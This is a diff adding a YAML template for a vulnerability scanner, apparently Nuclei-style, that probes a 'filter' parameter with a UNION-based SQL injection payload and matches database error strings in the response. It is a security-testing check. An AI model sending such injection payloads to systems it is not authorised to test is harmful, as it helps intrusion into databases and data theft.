@@ -1,0 +1,25 @@
+id: sqli7-195
+name: 'UNION probe in filter'
+severity: high
+type: active
+tags:
+  - sqli
+  - injection
+  - union
+description: 'Triggers DB error via filter'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      filter:
+        - ''') UNION SELECT NULL,NULL#'
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - 'SQL syntax'
+          - 'mysql_fetch'
+          - 'PostgreSQL'
+          - 'ODBC'
+          - 'ORA-'
+          - 'SQLite'
